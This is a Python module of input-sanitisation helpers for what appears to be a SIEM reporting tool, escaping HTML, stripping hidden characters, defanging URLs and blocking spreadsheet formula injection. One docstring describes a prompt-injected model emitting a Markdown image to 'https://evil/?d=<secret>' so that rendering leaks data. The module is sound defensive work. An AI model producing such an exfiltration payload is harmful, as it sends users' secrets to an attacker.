"""Input sanitisation helpers.

Every value that originates from SIEM data (or from an LLM) is untrusted and
must pass through one of these functions before it is placed in HTML.
"""
from __future__ import annotations

import html
import re
import unicodedata

# C0/C1 control characters (except \t \n \r), zero-width and bidi override chars
_CONTROL = re.compile(
    "[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f"
    "\u200b-\u200f\u202a-\u202e\u2060-\u2064\ufeff]"
)
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_MD_LINK = re.compile(r"\[([^\]]*)\]\((?:[^)]*)\)")
_BARE_URL = re.compile(r"https?://[^\s<>\"')]+", re.I)
_TAG = re.compile(r"<[^>]*>")


def strip_controls(value: object) -> str:
    """Return ``value`` as text with control / invisible characters removed."""
    text = "" if value is None else str(value)
    return _CONTROL.sub("", unicodedata.normalize("NFC", text))


def sanitize_html(value: object) -> str:
    """HTML-escape any value so it is inert inside markup *and* attributes."""
    return html.escape(strip_controls(value), quote=True)


def strip_tags(value: object) -> str:
    """Remove anything that looks like an HTML tag (defence in depth)."""
    return _TAG.sub("", strip_controls(value))


def sanitize_llm_output(value: object) -> str:
    """Make model output safe to render as Markdown.

    A prompt-injected model could emit ``![x](https://evil/?d=<secret>)``; the
    browser would fetch that URL when rendered, leaking data.  We therefore drop
    Markdown images, flatten links to their label, defang bare URLs and strip
    raw HTML.
    """
    text = strip_tags(value)
    text = _MD_IMAGE.sub("[image removed]", text)
    text = _MD_LINK.sub(r"\1", text)
    text = _BARE_URL.sub(lambda m: defang(m.group(0)), text)
    return text


def defang(indicator: str) -> str:
    """Defang an IOC so it cannot be clicked or auto-resolved by accident."""
    out = indicator.replace("http://", "hxxp://").replace("https://", "hxxps://")
    out = out.replace("@", "[at]")
    return re.sub(r"\.(?=[A-Za-z0-9])", "[.]", out)


def csv_safe(value: object) -> object:
    """Neutralise spreadsheet formula injection in exported cells."""
    if isinstance(value, str) and value[:1] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + value
    return value
